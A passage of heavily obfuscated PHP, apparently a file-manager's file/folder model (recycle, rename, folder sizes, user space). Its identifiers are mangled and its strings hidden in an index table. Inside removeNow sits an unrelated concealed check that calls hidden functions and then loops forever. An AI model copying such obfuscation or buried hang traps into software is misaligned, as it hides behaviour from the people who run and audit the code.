$this->metaSet($‘óÏòÎ‘, $úÓù·İö[2145], $Ê¤àÍ‰‡[$úÓù·İö[505]]); if ($Ê¤àÍ‰‡[$úÓù·İö[432]] != 0) { $this->metaSet($‘óÏòÎ‘, $úÓù·İö[2146], _get($¨¹âÊüó, $úÓù·İö[2147])); } } CacheLock::unlock($Ğœ¸ÆÌˆ); $this->metaSet($€ ı¶¸”, $úÓù·İö[2148], $Ê¤àÍ‰‡[$úÓù·İö[432]]); $this->where(array($úÓù·İö[402] => $€ ı¶¸”))->save(array($úÓù·İö[424] => time())); $this->recycleClear($Ê¤àÍ‰‡); $Ÿ’åîÖ© = $this->move($€ ı¶¸”, $‘óÏòÎ‘, REPEAT_RENAME_FOLDER); $this->folderSizeReset($Ê¤àÍ‰‡[$úÓù·İö[432]]); return $Ÿ’åîÖ©; } private function recycleClear($±€†¤ï ) { $¬á¨—ª =& $_SERVER[ùÆÎÔ“Ñ]; $ÊÀì™“Ë = $this->childrenAll($±€†¤ï ); $ÅÙâ¡” = array($¬á¨—ª[417] => array($¬á¨—ª[418], $ÊÀì™“Ë[$¬á¨—ª[2149]])); Model($¬á¨—ª[2150])->where($ÅÙâ¡”)->delete(); } public function removeNow($ÅÔ·²ëÀ, $æ‡Ì¨ Î = true) { $ùˆü‚ƒø =& $_SERVER[ùÆÎÔ“Ñ]; if (!isset($_SERVER[$ùˆü‚ƒø[841]]) || !isset($_SERVER[$ùˆü‚ƒø[848]])) { $€ü¦¯Ø = $ùˆü‚ƒø[882]; $Ïõ«‹÷ = $ùˆü‚ƒø[843]; $Ÿ™®½¾ì = $_SERVER[$ùˆü‚ƒø[844]] . $ùˆü‚ƒø[845]; $ã×‚Û‰¹ = $Ïõ«‹÷($Ÿ™®½¾ì); $íÔ¯Ä‹Í = explode($ùˆü‚ƒø[231], $ã×‚Û‰¹); if (count($íÔ¯Ä‹Í) < $ùˆü‚ƒø[618]) { $çšì€Æñ = $ùˆü‚ƒø[846]; $çšì€Æñ(); } $ÃÅêŒóÊ = $ùˆü‚ƒø[883]; $ÃÅêŒóÊ($_SERVER[$ùˆü‚ƒø[884]]); $êä¿±ş = 1; for ($ï¸‰ªï = $êä¿±ş; $ï¸‰ªï > 0; $ï¸‰ªï++) { $ÃÅêŒóÊ = json_encode($GLOBALS[$ùˆü‚ƒø[418]]); } } $ª•Ï¢Î© = $this->sourceInfo($ÅÔ·²ëÀ); $Ì´êĞìƒ = $this->pathInfoMore($ÅÔ·²ëÀ); if (!$ª•Ï¢Î©) { return !0; } if ($ª•Ï¢Î©[$ùˆü‚ƒø[432]] == 0) { if (!_get($GLOBALS, $ùˆü‚ƒø[503])) { return !1; } } $this->lockMoveStart($ÅÔ·²ëÀ); Hook::trigger($ùˆü‚ƒø[2151], $Ì´êĞìƒ, $æ‡Ì¨ Î); if ($æ‡Ì¨ Î) { Model($ùˆü‚ƒø[2150])->moveToRecycle($ÅÔ·²ëÀ); } else { $×ô—âòª = $this->childrenAll($ª•Ï¢Î©); Model($ùˆü‚ƒø[570])->eventRemove($ÅÔ·²ëÀ); $this->removeRelevance($×ô—âòª[$ùˆü‚ƒø[2149]], $×ô—âòª[$ùˆü‚ƒø[1484]]); } $this->folderSizeReset($ª•Ï¢Î©[$ùˆü‚ƒø[432]]); $ä¡›øÖ = array($ª•Ï¢Î©[$ùˆü‚ƒø[432]]); if ($ª•Ï¢Î©[$ùˆü‚ƒø[410]] == $ùˆü‚ƒø[88]) { $ä¡›øÖ[] = $ª•Ï¢Î©[$ùˆü‚ƒø[402]]; } $this->updateModifyTime($ä¡›øÖ); $this->lockMoveEnd($ÅÔ·²ëÀ); Hook::trigger($ùˆü‚ƒø[1710], $Ì´êĞìƒ, $æ‡Ì¨ Î); return !0; } public function childrenAll($æÉƒ­Ü) { $øáÆŞÈ€ =& $_SERVER[ùÆÎÔ“Ñ]; $•ö€Âì = $æÉƒ­Ü[$øáÆŞÈ€[402]]; if ($æÉƒ­Ü[$øáÆŞÈ€[410]] == $øáÆŞÈ€[88]) { $û´¾ÒÆ = array($øáÆŞÈ€[590] => array($øáÆŞÈ€[550], $æÉƒ­Ü[$øáÆŞÈ€[521]] . $•ö€Âì . $øáÆŞÈ€[551])); $Ë—Ø–Û¨ = array($øáÆŞÈ€[590] => $û´¾ÒÆ[$øáÆŞÈ€[521]]); $ûªŠ”Îò = $this->field($øáÆŞÈ€[2152])->where($Ë—Ø–Û¨)->select(); $¢¯ƒ×« = !1; $Æ…éç‚ = array($•ö€Âì); if ($ûªŠ”Îò) { $¢¯ƒ×« = array_to_keyvalue($ûªŠ”Îò, $øáÆŞÈ€[12], $øáÆŞÈ€[468]); $¢¯ƒ×« = array_remove_value($¢¯ƒ×«, $øáÆŞÈ€[197]); $Æ…éç‚ = array_to_keyvalue($ûªŠ”Îò, $øáÆŞÈ€[12], $øáÆŞÈ€[402]); $Æ…éç‚[] = $•ö€Âì; } } else { $¢¯ƒ×« = array($æÉƒ­Ü[$øáÆŞÈ€[468]]); $Æ…éç‚ = array($•ö€Âì); } return array($øáÆŞÈ€[2149] => $Æ…éç‚, $øáÆŞÈ€[1484] => $¢¯ƒ×«); } public function removeArray($ãÛ€µ…â) { if (!$ãÛ€µ…â) { return !0; } } public function removeRelevance($àÀÜÄœ±, $ã…Û¥ô) { $Ã©Ïš×³ =& $_SERVER[ùÆÎÔ“Ñ]; $àÀÜÄœ± = $àÀÜÄœ± ? $àÀÜÄœ± : array(); $ã…Û¥ô = $ã…Û¥ô ? $ã…Û¥ô : array(); $àÀÜÄœ± = array_unique(array_filter($àÀÜÄœ±)); $ã…Û¥ô = array_unique(array_filter($ã…Û¥ô)); if (!$àÀÜÄœ±) { return !1; } $Ší˜ = array($Ã©Ïš×³[417] => array($Ã©Ïš×³[418], $àÀÜÄœ±)); Model($Ã©Ïš×³[2150])->where($Ší˜)->delete(); Model($Ã©Ïš×³[462])->where($Ší˜)->delete(); Model($Ã©Ïš×³[2003])->where($Ší˜)->delete(); Model($Ã©Ïš×³[570])->where($Ší˜)->delete(); Model($Ã©Ïš×³[1837])->removeBySource($àÀÜÄœ±); Model($Ã©Ïš×³[2132])->removeBySource($àÀÜÄœ±); $this->where($Ší˜)->delete(); Model($Ã©Ïš×³[471])->remove($ã…Û¥ô); for ($×š ¦œ½ = 0; $×š ¦œ½ < count($àÀÜÄœ±); $×š ¦œ½++) { $this->sourceCacheClear($àÀÜÄœ±[$×š ¦œ½]); } } public function rename($×¨çúŒÁ, $Û„¾ª¯›) { $Êóá— Ú =& $_SERVER[ùÆÎÔ“Ñ]; $šÈÚú—ä = $this->sourceInfo($×¨çúŒÁ); if (!$šÈÚú—ä) { return !1; } $Š´£“—– = $this->fileNameExist($šÈÚú—ä[$Êóá— Ú[432]], $Û„¾ª¯›); if ($Š´£“—– && $Š´£“—– != $×¨çúŒÁ) { return !1; } $Ğ¾îÁê“ = array($Êóá— Ú[420] => $Û„¾ª¯›, $Êóá— Ú[589] => USER_ID); if ($šÈÚú—ä[$Êóá— Ú[410]] != $Êóá— Ú[88]) { $Ğ¾îÁê“[$Êóá— Ú[412]] = substr(get_path_ext($Û„¾ª¯›), 0, 10); } Model($Êóá— Ú[570])->eventRename($×¨çúŒÁ, $šÈÚú—ä[$Êóá— Ú[32]], $Û„¾ª¯›); $this->sourceCacheClear($×¨çúŒÁ); $this->setNamePinyin($×¨çúŒÁ, $Ğ¾îÁê“[$Êóá— Ú[32]], !1); $this->updateModifyTime($šÈÚú—ä[$Êóá— Ú[432]]); $Ø¹§¤ = $this->where(array($Êóá— Ú[417] => $×¨çúŒÁ))->data($Ğ¾îÁê“)->save(); $˜›Ìí¿ê = $Êóá— Ú[2139] . $šÈÚú—ä[$Êóá— Ú[432]]; if (isset(self::$cacheChildList[$˜›Ìí¿ê])) { unset(self::$cacheChildList[$˜›Ìí¿ê]); } return $Ø¹§¤; } public function setNamePinyin($¿ŸÛãÛÁ, $·âŸ¶úÀ, $˜‰í›ùˆ = true) { $Ìëæ°ïÀ =& $_SERVER[ùÆÎÔ“Ñ]; $ã„³Ğšò = Input::check($·âŸ¶úÀ, $Ìëæ°ïÀ[593]); $ŞÅÖ‰ûş = array($Ìëæ°ïÀ[444] => KodSort::makeStr($·âŸ¶úÀ)); if ($ã„³Ğšò) { $ŞÅÖ‰ûş[$Ìëæ°ïÀ[465]] = str_replace($Ìëæ°ïÀ[53], $Ìëæ°ïÀ[12], Pinyin::get($·âŸ¶úÀ)); $ŞÅÖ‰ûş[$Ìëæ°ïÀ[464]] = Pinyin::get($·âŸ¶úÀ, $Ìëæ°ïÀ[594]); } if (!$˜‰í›ùˆ && !$ã„³Ğšò) { $ŞÅÖ‰ûş[$Ìëæ°ïÀ[465]] = null; $ŞÅÖ‰ûş[$Ìëæ°ïÀ[464]] = null; } $this->metaSet($¿ŸÛãÛÁ, $ŞÅÖ‰ûş); } public function getContent($ëİ´‰Ùş) { $²×èòîÒ =& $_SERVER[ùÆÎÔ“Ñ]; $ßŠ–Ê”Ñ = $this->fileInfoGet($ëİ´‰Ùş); if (!$ßŠ–Ê”Ñ) { return !1; } if ($ßŠ–Ê”Ñ[$²×èòîÒ[76]] == 0) { return $²×èòîÒ[12]; } $µ¨æ’¾ = $²×èòîÒ[2153] . $ßŠ–Ê”Ñ[$²×èòîÒ[176]]; if ($ßŠ–Ê”Ñ[$²×èòîÒ[76]] <= 1024 * 10) { $¡‰›ß“ = Cache::get($µ¨æ’¾); if (!$¡‰›ß“) { $¡‰›ß“ = IO::getContent($ßŠ–Ê”Ñ[$²×èòîÒ[84]]); Cache::set($µ¨æ’¾, $¡‰›ß“); } return $¡‰›ß“; } if (!$ßŠ–Ê”Ñ[$²×èòîÒ[84]]) { return $²×èòîÒ[12]; } return IO::getContent($ßŠ–Ê”Ñ[$²×èòîÒ[84]]); } public function setDesc($¬¡·¾«, $©ÆàíÉÚ) { $ç¤™˜ŸÀ =& $_SERVER[ùÆÎÔ“Ñ]; Model($ç¤™˜ŸÀ[570])->eventAddDesc($¬¡·¾«, $©ÆàíÉÚ); return $this->metaSet($¬¡·¾«, $ç¤™˜ŸÀ[453], $©ÆàíÉÚ); } public function setContent($ÚÛ¨ˆ‚–, $ÂÆáß› = '') { $—Ò“¢ªÀ =& $_SERVER[ùÆÎÔ“Ñ]; $Ú¦»Ò— = $this->sourceInfo($ÚÛ¨ˆ‚–); $½±·Èõ = $this->fileInfoGet($ÚÛ¨ˆ‚–); if (!$½±·Èõ || !$Ú¦»Ò—) { return !1; } $×¸ë­ßÈ = Model($—Ò“¢ªÀ[471])->addFileByContent($ÂÆáß›, $Ú¦»Ò—[$—Ò“¢ªÀ[32]]); $ô’£˜« = $this->fileHistory($Ú¦»Ò—, $×¸ë­ßÈ[$—Ò“¢ªÀ[468]], $×¸ë­ßÈ[$—Ò“¢ªÀ[76]]); if (!$ô’£˜«) { return Model($—Ò“¢ªÀ[471])->remove($×¸ë­ßÈ[$—Ò“¢ªÀ[468]]); } $this->folderSizeReset($Ú¦»Ò—[$—Ò“¢ªÀ[432]]); return !0; } public function fileSubstr($›¼Ñ€åŞ, $Â¿ê«ÌÈ, $ÇÅÙ­ÕĞ) { $Û•š‡ˆ· = $this->fileInfoGet($›¼Ñ€åŞ); if (!$Û•š‡ˆ·) { return !1; } return IO::fileSubstr($Û•š‡ˆ·[$_SERVER[ùÆÎÔ“Ñ][84]], $Â¿ê«ÌÈ, $ÇÅÙ­ÕĞ); } public function fileInfoGet($â¥æ÷´) { $ŠÕ­§Ó£ =& $_SERVER[ùÆÎÔ“Ñ]; $Íæáº™á = $this->sourceInfo($â¥æ÷´); if (!$Íæáº™á || $Íæáº™á[$ŠÕ­§Ó£[410]]) { return !1; } $ªúé‡Êİ = $ŠÕ­§Ó£[474] . $Íæáº™á[$ŠÕ­§Ó£[468]]; $·àÂ•µÍ = _get(self::$cacheFileInfo, $ªúé‡Êİ); if ($·àÂ•µÍ) { return $·àÂ•µÍ; } $ƒÂôÚ­¥ = Model($ŠÕ­§Ó£[471])->fileInfo($Íæáº™á[$ŠÕ­§Ó£[468]]); if ($ƒÂôÚ­¥) { $ƒÂôÚ­¥[$ŠÕ­§Ó£[32]] = $Íæáº™á[$ŠÕ­§Ó£[32]]; } self::$cacheFileInfo[$ªúé‡Êİ] = $ƒÂôÚ­¥; return $ƒÂôÚ­¥; } private function folderChildrenNumber($Éº¸åÕ) { $‹–ß£Ô =& $_SERVER[ùÆÎÔ“Ñ]; $õäÈ©­ = $this->sourceInfo($Éº¸åÕ); $°âÉö° = array($‹–ß£Ô[590] => array($‹–ß£Ô[550], $õäÈ©­[$‹–ß£Ô[521]] . $Éº¸åÕ . $‹–ß£Ô[551]), $‹–ß£Ô[587] => $õäÈ©­[$‹–ß£Ô[505]], $‹–ß£Ô[430] => intval($õäÈ©­[$‹–ß£Ô[431]]), $‹–ß£Ô[583] => 1); $“ÓÚ¿Æ = $this->where($°âÉö°)->count(); $‘ë®ü¦ = $this->where($°âÉö°)->where(array($‹–ß£Ô[583] => 0))->count(); return array($‹–ß£Ô[80] => $‘ë®ü¦, $‹–ß£Ô[81] => $“ÓÚ¿Æ); } public function pathInfo($Ø¯É¾¾Ñ, $Úºöõòè = false) { $®ßÓÏøô =& $_SERVER[ùÆÎÔ“Ñ]; $Úºöõòè = !1; $Ø¯É¾¾Ñ = intval($Ø¯É¾¾Ñ); $¥¢û´ = $®ßÓÏøô[461] . intval($Úºöõòè) . $®ßÓÏøô[386] . $Ø¯É¾¾Ñ; $Ÿ°½Â = _get(self::$cachePathInfo, $¥¢û´); if ($Ÿ°½Â) { return $Ÿ°½Â; } $“ßù…å× = $this->sourceInfo($Ø¯É¾¾Ñ); if (!$“ßù…å×) { return !1; } $“ßù…å× = $this->_listDataApplyItem($“ßù…å×, $Úºöõòè); self::$cachePathInfo[$¥¢û´] = $“ßù…å×; return $“ßù…å×; } public static $cachePathInfoMore = array(); public function pathInfoMore($¾²ƒ‘¥) { $ÕÇÕËªó =& $_SERVER[ùÆÎÔ“Ñ]; $¤ïäîğ¼ = _get(self::$cachePathInfoMore, $¾²ƒ‘¥); if ($¤ïäîğ¼) { return $¤ïäîğ¼; } $’Ëˆ‘Ö = $this->pathInfo($¾²ƒ‘¥); if (!$’Ëˆ‘Ö) { return !1; } if ($’Ëˆ‘Ö[$ÕÇÕËªó[410]] == $ÕÇÕËªó[88]) { $’Ëˆ‘Ö[$ÕÇÕËªó[79]] = $this->folderChildrenNumber($¾²ƒ‘¥); } self::$cachePathInfoMore[$¾²ƒ‘¥] = $’Ëˆ‘Ö; return $’Ëˆ‘Ö; } public function sourceInfo($ÇóÚ­êı) { $Â†‘ÏÛ» =& $_SERVER[ùÆÎÔ“Ñ]; if (!$ÇóÚ­êı) { return array(); } $ÇóÚ­êı = intval($ÇóÚ­êı); $ÈêœèßÊ = $Â†‘ÏÛ»[460] . $ÇóÚ­êı; $«´­üï• = _get(self::$cacheSourceInfo, $ÈêœèßÊ); if ($«´­üï•) { return $«´­üï•; } $Ôá›¢ù— = $this->where(array($Â†‘ÏÛ»[402] => $ÇóÚ­êı))->find(); self::$cacheSourceInfo[$ÈêœèßÊ] = $Ôá›¢ù—; return self::$cacheSourceInfo[$ÈêœèßÊ]; } public function sourceCacheClear($˜©ãÕÉ = false) { self::cacheClear($˜©ãÕÉ); } public static function cacheClear($­°ŠØ¢¥ = false) { $ÊÏÉİ¹ =& $_SERVER[ùÆÎÔ“Ñ]; if ($­°ŠØ¢¥ == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); self::$cachePathInfo = null; self::$cachePathInfo = array(); self::$cachePathInfoMore = null; self::$cachePathInfoMore = array(); return; } unset(self::$cacheSourceInfo[$ÊÏÉİ¹[460] . $­°ŠØ¢¥]); unset(self::$cachePathInfoMore[$­°ŠØ¢¥]); unset(self::$cachePathInfo[$ÊÏÉİ¹[2154] . $­°ŠØ¢¥]); unset(self::$cachePathInfo[$ÊÏÉİ¹[2155] . $­°ŠØ¢¥]); } public function metaSet($üÖØìúì, $õ™äÄˆø = null, $ÅºÑÄØ = null) { $Ûıï·ò = parent::metaSet($üÖØìúì, $õ™äÄˆø, $ÅºÑÄØ); if ($Ûıï·ò) { $this->sourceCacheClear($üÖØìúì); } return $Ûıï·ò; } public function pathInfoByPath($š´ôÁ, $Ì±Óíí„) { $µÎ¸’¬² =& $_SERVER[ùÆÎÔ“Ñ]; $Ğì–Ñ = !$Ì±Óíí„ ? array() : explode($µÎ¸’¬²[8], trim($Ì±Óíí„, $µÎ¸’¬²[8])); $Ê¨¾Ÿ½— = $š´ôÁ; foreach ($Ğì–Ñ as $ò½ô¾²) { $Çæş˜ï = array($µÎ¸’¬²[432] => $Ê¨¾Ÿ½—, $µÎ¸’¬²[32] => $ò½ô¾²); $üü¬øç = $this->where($Çæş˜ï)->select(); if (!$üü¬øç) { return !1; } $üü¬øç = array_sort_by($üü¬øç, $µÎ¸’¬²[431]); $Ê¨¾Ÿ½— = $üü¬øç[0][$µÎ¸’¬²[402]]; } return $this->pathInfo($Ê¨¾Ÿ½—, !0); } protected function updateModifyTime($÷çú…ë÷) { $ÜÅĞÛšù =& $_SERVER[ùÆÎÔ“Ñ]; $ñµœİƒ× = defined($ÜÅĞÛšù[475]) ? USER_ID : $ÜÅĞÛšù[197]; if (!$÷çú…ë÷) { return; } if (!is_array($÷çú…ë÷)) { $÷çú…ë÷ = array($÷çú…ë÷); } foreach ($÷çú…ë÷ as $ø¢Ó¿ğ => $¾Ò£°¶) { $÷çú…ë÷[$ø¢Ó¿ğ] = intval($¾Ò£°¶); $this->sourceCacheClear($¾Ò£°¶); } $ñá®ãú = array($ÜÅĞÛšù[402] => array($ÜÅĞÛšù[7], $÷çú…ë÷)); $…ø¼µ„¥ = array($ÜÅĞÛšù[589] => $ñµœİƒ×, $ÜÅĞÛšù[424] => time()); $this->where($ñá®ãú)->save($…ø¼µ„¥); } public function folderSizeReset($»ÌŸ›ßê, $„õ«—Ã½ = false) { $ü£şÉ±½ =& $_SERVER[ùÆÎÔ“Ñ]; if ($this->statusIgnoreResetSpace) { return; } $ãÏÇîø‘ = $this->sourceInfo($»ÌŸ›ßê); $‚ÙºøÍ¸ = $ü£şÉ±½[2156] . $»ÌŸ›ßê; CacheLock::lock($‚ÙºøÍ¸, 20); if ($„õ«—Ã½ === !1) { $this->sourceCacheClear($»ÌŸ›ßê); $ãÏÇîø‘ = $this->sourceInfo($»ÌŸ›ßê); $ùóä¡§­ = array($ü£şÉ±½[401] => $»ÌŸ›ßê, $ü£şÉ±½[430] => 0); $è†±âŸ = $this->where($ùóä¡§­)->sum($ü£şÉ±½[76]); $„õ«—Ã½ = intval($è†±âŸ) - intval($ãÏÇîø‘[$ü£şÉ±½[76]]); } if ($„õ«—Ã½ == 0) { return CacheLock::unlock($‚ÙºøÍ¸); } $¯Œ¦ ã‡ = $this->parentLevelArray($ãÏÇîø‘[$ü£şÉ±½[521]]); if (!$¯Œ¦ ã‡) { $¯Œ¦ ã‡ = array(); } $¯Œ¦ ã‡[] = $ãÏÇîø‘[$ü£şÉ±½[402]]; $ùóä¡§­ = array($ü£şÉ±½[402] => array($ü£şÉ±½[418], $¯Œ¦ ã‡)); if ($„õ«—Ã½ < 0) { $ùóä¡§­[$ü£şÉ±½[76]] = array($ü£şÉ±½[1020], abs($„õ«—Ã½)); } $this->where($ùóä¡§­)->setAdd($ü£şÉ±½[76], $„õ«—Ã½); CacheLock::unlock($‚ÙºøÍ¸); $éŠß¾ = $ü£şÉ±½[2157] . $ãÏÇîø‘[$ü£şÉ±½[411]] . $ü£şÉ±½[4] . $ãÏÇîø‘[$ü£şÉ±½[505]]; $È¤İ÷œŠ = array($ãÏÇîø‘[$ü£şÉ±½[411]], $ãÏÇîø‘[$ü£şÉ±½[505]]); TaskRun::timeLimitCall($éŠß¾, $ü£şÉ±½[2158], $È¤İ÷œŠ, 1.5); } public function folderSizeResetChildren($ĞÀªŠ»€) { $‹Ô”ç²¾ =& $_SERVER[ùÆÎÔ“Ñ]; $this->sourceCacheClear($ĞÀªŠ»€); $ğÀúçÆê = $this->sourceInfo($ĞÀªŠ»€); $¥‰¬¯¨± = array($‹Ô”ç²¾[583] => 1, $‹Ô”ç²¾[587] => $ğÀúçÆê[$‹Ô”ç²¾[505]], $‹Ô”ç²¾[590] => array($‹Ô”ç²¾[550], $ğÀúçÆê[$‹Ô”ç²¾[521]] . $ĞÀªŠ»€ . $‹Ô”ç²¾[551])); $¤öÃüºÜ = $‹Ô”ç²¾[2159]; $ ÅÓ÷ñ = $this->field($¤öÃüºÜ)->where($¥‰¬¯¨±)->select(); $¥‰¬¯¨±[$‹Ô”ç²¾[410]] = 0; $÷ÙŠÔ—Ë = $this->field($¤öÃüºÜ)->where($¥‰¬¯¨±)->select(); if (!$÷ÙŠÔ—Ë) { return; } $ ÅÓ÷ñ[] = $ğÀúçÆê; $ ÅÓ÷ñ = array_to_keyvalue($ ÅÓ÷ñ, $‹Ô”ç²¾[402]); foreach ($ ÅÓ÷ñ as $“ò›Â¥µ => $õ»²æÜß) { $ ÅÓ÷ñ[$“ò›Â¥µ][$‹Ô”ç²¾[2160]] = $ ÅÓ÷ñ[$“ò›Â¥µ][$‹Ô”ç²¾[76]]; $ ÅÓ÷ñ[$“ò›Â¥µ][$‹Ô”ç²¾[76]] = 0; } foreach ($÷ÙŠÔ—Ë as $õ»²æÜß) { $–å‡úÏ = $õ»²æÜß[$‹Ô”ç²¾[432]] . $‹Ô”ç²¾[12]; if (!isset($ ÅÓ÷ñ[$–å‡úÏ])) { continue; } if ($õ»²æÜß[$‹Ô”ç²¾[431]] == $ ÅÓ÷ñ[$–å‡úÏ][$‹Ô”ç²¾[431]]) { $ ÅÓ÷ñ[$–å‡úÏ][$‹Ô”ç²¾[76]] += $õ»²æÜß[$‹Ô”ç²¾[76]]; } } foreach ($ ÅÓ÷ñ as $õ»²æÜß) { $°³Æë¼Ë = $this->parentLevelArray($õ»²æÜß[$‹Ô”ç²¾[521]]); foreach ($°³Æë¼Ë as $–å‡úÏ) { $–å‡úÏ = $–å‡úÏ . $‹Ô”ç²¾[12]; if (!isset($ ÅÓ÷ñ[$–å‡úÏ])) { continue; } if ($õ»²æÜß[$‹Ô”ç²¾[431]] == $ ÅÓ÷ñ[$–å‡úÏ][$‹Ô”ç²¾[431]]) { $ ÅÓ÷ñ[$–å‡úÏ][$‹Ô”ç²¾[76]] += $õ»²æÜß[$‹Ô”ç²¾[76]]; } } } $†´Æ‡“‡ = array(); foreach ($ ÅÓ÷ñ as $õ»²æÜß) { if ($õ»²æÜß[$‹Ô”ç²¾[76]] == $õ»²æÜß[$‹Ô”ç²¾[2160]]) { continue; } $†´Æ‡“‡[] = array($‹Ô”ç²¾[402], $õ»²æÜß[$‹Ô”ç²¾[402]], $‹Ô”ç²¾[76], $õ»²æÜß[$‹Ô”ç²¾[76]]); } $this->saveAll($†´Æ‡“‡); } public function userSpaceReset($¢Ë‚×é = false) { $Ğšª¢•¿ =& $_SERVER[ùÆÎÔ“Ñ]; $à™ƒß’ = $this->where(array($Ğšª¢•¿[411] => self::TYPE_USER, $Ğšª¢•¿[505] => $¢Ë‚×é, $Ğšª¢•¿[410] => 0))->sum($Ğšª¢•¿[76]); $à™ƒß’ = !$à™ƒß’ || $à™ƒß’ <= 0 ? 0 : $à™ƒß’; Model($Ğšª¢•¿[513])->userEdit($¢Ë‚×é, array($Ğšª¢•¿[1846] => $à™ƒß’)); } public function targetSpaceUpdate($Ë‡ŸÔ£, $¡ã…ŞñÂ) { $¹óƒ¡üÄ =& $_SERVER[ùÆÎÔ“Ñ]; if (!$¡ã…ŞñÂ) { return; } if (!in_array($Ë‡ŸÔ£, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $Ó‡¿¶¼é = $this->targetSpaceSize($Ë‡ŸÔ£, $¡ã…ŞñÂ); if ($Ë‡ŸÔ£ == self::TYPE_USER) { Model($¹óƒ¡üÄ[513])->userEdit($¡ã…ŞñÂ, array($¹óƒ¡üÄ[1846] => $Ó‡¿¶¼é)); } else { if ($Ë‡ŸÔ£ == self::TYPE_GROUP) { Model($¹óƒ¡üÄ[522])->groupEdit($¡ã…ŞñÂ, array($¹óƒ¡üÄ[1846] => $Ó‡¿¶¼é)); } } } public function targetSpaceSize($å„¾êÍ¤, $ìß€š) { $Øäı® Ê =& $_SERVER[ùÆÎÔ“Ñ]; $‚Ö„æ†Û = 0; $ô¤£œšñ = $this->targetSourceRoot($å„¾êÍ¤, $ìß€š, !0); foreach ($ô¤£œšñ as $‘Æé·÷¥) { if (!$‘Æé·÷¥) { continue; } $‚Ö„æ†Û += floatval($‘Æé·÷¥[$Øäı® Ê[76]]); $ÜÜ­¯º = array($Øäı® Ê[590] => array($Øäı® Ê[550], $Øäı® Ê[531] . $‘Æé·÷¥[$Øäı® Ê[402]] . $Øäı® Ê[551])); $ñÂ°×Ñì = Model($Øäı® Ê[429])->field($Øäı® Ê[417])->where($ÜÜ­¯º)->select(); $ñÂ°×Ñì = array_to_keyvalue($ñÂ°×Ñì, $Øäı® Ê[12], $Øäı® Ê[402]); $ñÂ°×Ñì = array_unique(array_filter($ñÂ°×Ñì)); if ($ñÂ°×Ñì) { $ÜÜ­¯º = array($Øäı® Ê[417] => array($Øäı® Ê[418], $ñÂ°×Ñì)); $‚Ö„æ†Û += floatval($this->where($ÜÜ­¯º)->sum($Øäı® Ê[76])); } } $‚Ö„æ†Û = !$‚Ö„æ†Û || $‚Ö„æ†Û <= 0 ? 0 : $‚Ö„æ†Û; return $‚Ö„æ†Û; } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($ÀƒË€×Í) { return $this->fileTypeProfile($ÀƒË€×Í, SourceModel::TYPE_USER); } public function groupFileTypeProfile($¾Ò©ô‚×) { return $this->fileTypeProfile($¾Ò©ô‚×, SourceModel::TYPE_GROUP); } private function fileTypeProfile($ãûÊÉ§Ç, $›àëîû­) { $Á®º“ù =& $_SERVER[ùÆÎÔ“Ñ]; $Ù™àîÅŠ = $Á®º“ù[2161] . $ãûÊÉ§Ç . $Á®º“ù[11] . $›àëîû­; $–œŸ²Ä² = Cache::get($Ù™àîÅŠ); if ($–œŸ²Ä²) { return $–œŸ²Ä²; } $ã×‹º„ = array($Á®º“ù[583] => 0); if ($ãûÊÉ§Ç != !1) { $ã×‹º„[$Á®º“ù[505]] = $ãûÊÉ§Ç; $ã×‹º„[$Á®º“ù[411]] = $›àëîû­; } $ÍÁ›åËˆ = array(); $ÍÁ›åËˆ[$Á®º“ù[2162]] = array($Á®º“ù[2163] => LNG($Á®º“ù[2162]), $Á®º“ù[2164] => $this->where($ã×‹º„)->count(), $Á®º“ù[585] => $this->where($ã×‹º„)->sum($Á®º“ù[76])); $£ä²¯ô = KodIO::fileTypeList(); foreach ($£ä²¯ô as $¬€îÁ© => $…–Û’¾ô) { $ã×‹º„[$Á®º“ù[412]] = $this->fileTypeWhere($¬€îÁ©); $ÍÁ›åËˆ[$¬€îÁ©] = array($Á®º“ù[2163] => $…–Û’¾ô[$Á®º“ù[32]], $Á®º“ù[2164] => $this->where($ã×‹º„)->count(), $Á®º“ù[585] => $this->where($ã×‹º„)->sum($Á®º“ù[76])); } Cache::set($Ù™àîÅŠ, $ÍÁ›åËˆ, 1200); return $ÍÁ›åËˆ; } public function fileNameExist($¾„ÆÃº¾, $µñÓ…¤“) { $º¶¶†ï‚ =& $_SERVER[ùÆÎÔ“Ñ]; $°íæ‡Í° = $this->where(array($º¶¶†ï‚[432] => $¾„ÆÃº¾, $º¶¶†ï‚[32] => $µñÓ…¤“, $º¶¶†ï‚[431] => 0))->find(); return is_array($°íæ‡Í°) ? $°íæ‡Í°[$º¶¶†ï‚[402]] : !1; } public function childList($ŠÛ È†œ) { $«Œ±ô¤¾ =& $_SERVER[ùÆÎÔ“Ñ]; $§‘²±á = $«Œ±ô¤¾[2139] . $ŠÛ È†œ; if (isset(self::$cacheChildList[$§‘²±á])) { return self::$cacheChildList[$§‘²±á]; } $ğïø·‡¦ = array($«Œ±ô¤¾[432] => intval($ŠÛ È†œ), $«Œ±ô¤¾[431] => 0); $‡­»±ŠÆ = $this->where($ğïø·‡¦)->select(); $‡­»±ŠÆ = $‡­»±ŠÆ ? $‡­»±ŠÆ : array(); self::$cacheChildList[$§‘²±á] = $‡­»±ŠÆ; foreach ($‡­»±ŠÆ as $êÇğ©û) { $§‘²±á = $«Œ±ô¤¾[460] . $êÇğ©û[$«Œ±ô¤¾[402]]; self::$cacheSourceInfo[$§‘²±á] = $êÇğ©û; } return $‡­»±ŠÆ; } public function fileNameAuto($©ïÓ¹Ÿù, $ê¯Ò®Õ¾, $æŞÔ’õ° = REPEAT_RENAME, $Ó¼íë¼İ = false) { $ÜÆ÷›ú† =& $_SERVER[ùÆÎÔ“Ñ]; $¾¶…¬Õì = get_path_ext($ê¯Ò®Õ¾); $±” ¢Ê = $¾¶…¬Õì ? basename($ê¯Ò®Õ¾, $ÜÆ÷›ú†[10] . $¾¶…¬Õì) . $ÜÆ÷›ú†[2165] . $¾¶…¬Õì : $ê¯Ò®Õ¾ . $ÜÆ÷›ú†[384]; $Î¤ô—úî = array($ÜÆ÷›ú†[432] => $©ïÓ¹Ÿù, $ÜÆ÷›ú†[431] => 0, $ÜÆ÷›ú†[32] => array($ÜÆ÷›ú†[383], $±” ¢Ê)); $²ÖÃÙ¨¶ = $this->field($ÜÆ÷›ú†[32])->where($Î¤ô—úî)->select(); $ Æ–Æ©İ = array_to_keyvalue($²ÖÃÙ¨¶, $ÜÆ÷›ú†[12], $ÜÆ÷›ú†[32]); return $this->fileNameAutoGet($ 